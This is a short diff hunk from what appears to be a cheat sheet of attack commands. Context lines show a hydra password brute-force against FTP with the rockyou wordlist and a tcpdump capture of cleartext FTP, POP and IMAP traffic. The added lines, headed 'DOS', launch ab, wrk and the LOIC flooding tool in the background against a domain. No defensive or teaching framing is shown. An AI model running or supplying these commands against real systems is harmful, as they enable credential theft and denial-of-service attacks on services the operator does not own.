@@ -268,3 +268,9 @@ curl -s https://api.example.com/admin/config
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://ip.example
 sudo tcpdump -i any port 21 or port 110 or port 143 -A
+
+DOS
+ab -n 10000 -c 100 https://yourdomain.com &
+wrk -t12 -c100 -d30s https://yourdomain.com &
+mono LOIC.exe &
+
